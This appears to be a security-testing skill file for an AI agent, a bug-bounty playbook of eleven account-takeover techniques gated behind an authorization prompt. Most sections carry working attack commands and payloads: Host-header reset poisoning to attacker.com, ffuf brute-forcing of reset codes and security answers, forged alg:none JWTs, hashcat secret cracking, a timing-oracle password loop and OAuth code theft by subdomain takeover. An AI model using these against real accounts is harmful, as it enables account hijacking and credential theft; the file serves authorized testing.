---
name: hunt-ato
description: Hunt account takeover taxonomy
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, public_research
report_count: 7
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### Path 10: Pre-Account / Unverified-Account Takeover
The victim's account exists in a pending/unverified state (invite not accepted, signup email never confirmed, or no email on file). Claim it first: register or attach your controlled email to that identity, then let the victim complete SSO/OTP login and inherit the attacker-seeded state — or trigger a reset once your email is attached. Test invite/pending flows and any endpoint that writes an email to an account lacking a confirmed one; confirm the victim, after signing in, lands in the account you seeded. High impact, no token interaction. Disclosed: reports/1679734, reports/394329.

### Path 11: Passwordless / Magic-Link Abuse by Identifier
A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

---

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
